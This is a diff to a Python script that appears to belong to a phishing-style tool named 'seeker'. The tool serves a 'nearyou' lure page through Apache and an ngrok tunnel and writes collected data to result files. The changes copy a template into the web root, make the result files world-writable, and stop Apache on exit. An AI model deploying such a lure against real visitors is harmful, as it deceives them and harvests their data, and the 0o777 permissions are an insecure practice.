@@ -6,6 +6,7 @@ import os
 import time
 import json
 import requests
+import distutils.dir_util
 import subprocess as subp
 
 try:
@@ -23,8 +24,9 @@ W = '\033[0m'  # white
 result = '/var/www/html/nearyou/php/result.txt'
 info = '/var/www/html/nearyou/php/info.txt'
 api = 'http://localhost:4040/api/tunnels'
+tmp = '/var/www/html/nearyou'
 site = 'nearyou'
-ver = '1.0.5'
+ver = '1.0.6'
 
 try:
 	raw_input          # Python 2
@@ -33,7 +35,7 @@ except NameError:
 
 def banner():
 	os.system('clear')
-	print (C +
+	print (G +
 	r'''                        __
   ______  ____   ____  |  | __  ____ _______
  /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
@@ -76,6 +78,11 @@ def version():
 
 def ngrok():
 	global api, site
+	print ('\n' + G + '[!]' + C + ' Loading Template...' + W)
+	distutils.dir_util.remove_tree(tmp)
+	distutils.dir_util.copy_tree('{}/template/nearyou'.format(swd), tmp)
+	os.chmod(info, 0o777)
+	os.chmod(result, 0o777)
 	print ('\n' + G + '[!]' + C + ' Starting Apache Server...' + W)
 	subp.Popen(['service', 'apache2', 'start'], stdin=subp.PIPE, stderr=subp.PIPE, stdout=subp.PIPE)
 	print ('\n' + G + '[+]' + C + ' Starting Ngrok...' + W + '\n')
@@ -199,6 +206,7 @@ def repeat():
 def quit():
 	global result
 	with open (result, 'w+'): pass
+	subp.call(['service', 'apache2', 'stop'])
 	os.system('pkill ngrok')
 	exit()
 
